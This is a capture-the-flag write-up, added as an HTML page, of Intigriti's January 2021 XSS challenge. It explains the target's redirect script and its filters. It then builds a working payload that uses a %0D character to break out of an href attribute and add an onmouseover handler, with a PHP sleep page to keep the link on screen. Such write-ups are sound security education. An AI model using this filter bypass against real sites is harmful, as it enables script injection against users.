@@ -1,0 +1,94 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, minimal-ui">
+    <title>Intigriti&#x27;s 0121 XSS Challenge (unintended solution)</title>
+    <link type="text/css" rel="stylesheet" href="assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="assets/css/hljs-github.min.css"/>
+  </head>
+  <body>
+    <article class="markdown-body"><h2 id="intigriti's-0121-xss-challenge-(unintended-solution)"><a class="header-link" href="#intigriti's-0121-xss-challenge-(unintended-solution)"></a>Intigriti&#39;s 0121 XSS Challenge (unintended solution)</h2>
+<p>On January 25th, Intigriti put a new XSS Challenge online. As usual, I had to try to solve it.</p>
+<p class="img-container"><img src="1.png" alt="Challenge main page"></p>
+<p>First step is to take a look at the source code to start analysing scripts.
+We can see that the page takes one script.js file</p>
+<p class="img-container"><img src="2.png" alt="script.js"></p>
+<p>The script.js content:</p>
+<pre class="hljs"><code>
+  <span class="hljs-built_in">window</span>.href = <span class="hljs-keyword">new</span> URL(<span class="hljs-built_in">window</span>.location.href);
+  <span class="hljs-built_in">window</span>.r = href.searchParams.get(<span class="hljs-string">"r"</span>);
+  <span class="hljs-comment">//Remove malicious values from href, redirect, referrer, name, ...</span>
+  [<span class="hljs-string">"document"</span>, <span class="hljs-string">"window"</span>].forEach(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">interface</span>)</span>{
+    <span class="hljs-built_in">Object</span>.keys(<span class="hljs-built_in">window</span>[interface]).forEach(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">globalVariable</span>)</span>{
+        <span class="hljs-keyword">if</span>((<span class="hljs-keyword">typeof</span> <span class="hljs-built_in">window</span>[interface][globalVariable] == <span class="hljs-string">"string"</span>) &amp;&amp; (<span class="hljs-built_in">window</span>[interface][globalVariable].indexOf(<span class="hljs-string">"javascript"</span>) &gt; <span class="hljs-number">-1</span>)){
+            <span class="hljs-keyword">delete</span> <span class="hljs-built_in">window</span>[interface][globalVariable];
+        }
+    });
+  });
+
+  <span class="hljs-built_in">window</span>.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{
+    <span class="hljs-built_in">var</span> links = <span class="hljs-built_in">document</span>.getElementsByTagName(<span class="hljs-string">"a"</span>);
+    <span class="hljs-keyword">for</span>(<span class="hljs-built_in">var</span> i = <span class="hljs-number">0</span>; i &lt; links.length; i++){
+      links[i].onclick = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>)</span>{
+        e.preventDefault();
+        safeRedirect(e.target.href);
+      }
+    }
+  }
+  <span class="hljs-keyword">if</span>(r != <span class="hljs-literal">undefined</span>){
+    safeRedirect(r);
+  }
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safeRedirect</span>(<span class="hljs-params">url</span>)</span>{
+    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">url</span>.match(<span class="hljs-regexp">/[&lt;&gt;"' ]/</span>)){
+      <span class="hljs-built_in">window</span>.setTimeout(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{
+          <span class="hljs-keyword">if</span>(<span class="hljs-built_in">url</span>.startsWith(<span class="hljs-string">"https://"</span>)){
+            <span class="hljs-built_in">window</span>.location = <span class="hljs-built_in">url</span>;
+          }
+          <span class="hljs-title">else</span>{ <span class="hljs-comment">//local redirect</span>
+            <span class="hljs-built_in">window</span>.location = <span class="hljs-built_in">window</span>.origin + <span class="hljs-string">"/"</span> + <span class="hljs-built_in">url</span>;
+          }
+          <span class="hljs-built_in">window</span>.setTimeout(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{
+            <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"error"</span>).style.display = <span class="hljs-string">"block"</span>;
+          }, <span class="hljs-number">1000</span>);
+      }, <span class="hljs-number">5000</span>);
+      <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"popover"</span>).innerHTML = <span class="hljs-string">`
+        &lt;p&gt;You're being redirected to <span class="hljs-subst">${url}</span> in 5 seconds...&lt;/p&gt;
+        &lt;p id="error" style="display:none"&gt;
+          If you're not being redirected, click &lt;a href=<span class="hljs-subst">${url}</span>&gt;here&lt;/a&gt;
+        &lt;/p&gt;.`</span>;
+    }
+    <span class="hljs-title">else</span>{
+      alert(<span class="hljs-string">"Invalid URL."</span>);
+    }
+  }</code></pre><p>Basically, on page load, the script will be looking for the <strong>r</strong> parameter in the URL and then redirect to user to the value of this parameter after 5 seconds. If <strong>r</strong> starts with <strong>https://</strong>, user will be redirected to external website. If not, the rediction will be local.
+Of course, we cannot set <strong>r</strong> to something like <strong>javascript:</strong> because the javascript keyworld would be filtered by the following code:</p>
+<pre class="hljs"><code><span class="hljs-comment">//Remove malicious values from href, redirect, referrer, name, ...</span>
+  [<span class="hljs-string">"document"</span>, <span class="hljs-string">"window"</span>].forEach(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">interface</span>)</span>{
+    <span class="hljs-built_in">Object</span>.keys(<span class="hljs-built_in">window</span>[interface]).forEach(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">globalVariable</span>)</span>{
+        <span class="hljs-keyword">if</span>((<span class="hljs-keyword">typeof</span> <span class="hljs-built_in">window</span>[interface][globalVariable] == <span class="hljs-string">"string"</span>) &amp;&amp; (<span class="hljs-built_in">window</span>[interface][globalVariable].indexOf(<span class="hljs-string">"javascript"</span>) &gt; <span class="hljs-number">-1</span>)){
+            <span class="hljs-keyword">delete</span> <span class="hljs-built_in">window</span>[interface][globalVariable];
+        }
+    });
+  });</code></pre><p>Also, some chars are flitered too : <strong>&lt; &gt; &quot; &#39; and spaces</strong>.</p>
+<p>One thing I noticed is that the <strong>r</strong> paramter value will be reflected in the &quot;popover&quot; div.</p>
+<pre class="hljs"><code><span class="xml">document.getElementById("popover").innerHTML = `
+        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>You're being redirected to $</span><span class="hljs-template-variable">{url}</span><span class="xml"> in 5 seconds...<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"error"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"display:none"</span>&gt;</span>
+          If you're not being redirected, click <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">$</span></span></span><span class="hljs-template-variable">{url}</span><span class="xml"><span class="hljs-tag">&gt;</span>here<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>.`;</span></code></pre><p>So, can we inject some payload in the anchor tag and get some script executed ? 
+My idea was to set a event on the link. After some tries, I decided to use the <strong>onmouseover</strong> event. But before, we need to find a way to bypass the filter because we cannot use something like <strong>url&quot; onmouseover=alert()</strong> (remember that spaces and double quotes are filtered !)
+In order to bypass this, I tried to put some chars as <strong>%0D</strong> after my URL and see what would happen, and I noticed that the browser would automatically close the <strong>href</strong> attribute !
+<img src="4.png" alt="%0D injection">
+That&#39;s what we need ! Let&#39;s replace <strong>test</strong> by <strong>onmouseover</strong>. As we cannot use quotes, to display the required flag, we need to use the <strong>String.fromCharCode</strong> function for example. <strong>alert(&#39;{THIS_IS_THE_FLAG}&#39;)</strong> becomes <strong>alert(String.fromCharCode(123,84,72,73,83,95,73,83,95,84,72,69,95,70,76,65,71,125))</strong> .</p>
+<p>One more thing: the popover and so the malicious link is displayed after a timeout, if the target page is too long to load. So, te be sure a potential victim sees it, I simply created a long loading page :</p>
+<pre class="hljs"><code><span class="php"><span class="hljs-meta">&lt;?php</span>
+sleep(<span class="hljs-number">100</span>);
+<span class="hljs-meta">?&gt;</span></span></code></pre><p>Final payload is: (http<strong>s</strong> is important!)
+<a href="https://challenge-0121.intigriti.io/?r=https://my-server/longpage.php?%0Donmouseover=alert(String.fromCharCode(123,84,72,73,83,95,73,83,95,84,72,69,95,70,76,65,71,125)">https://challenge-0121.intigriti.io/?r=https://my-server/longpage.php?%0Donmouseover=alert(String.fromCharCode(123,84,72,73,83,95,73,83,95,84,72,69,95,70,76,65,71,125)</a>)</p>
+<p>(To maximum your chance to have a user moving his mouse over the link, you can add some inline style to make it bigger)</p>
+<p class="img-container"><img src="5.png" alt="xss"></p>
+    </article>
+  </body>
+</html>
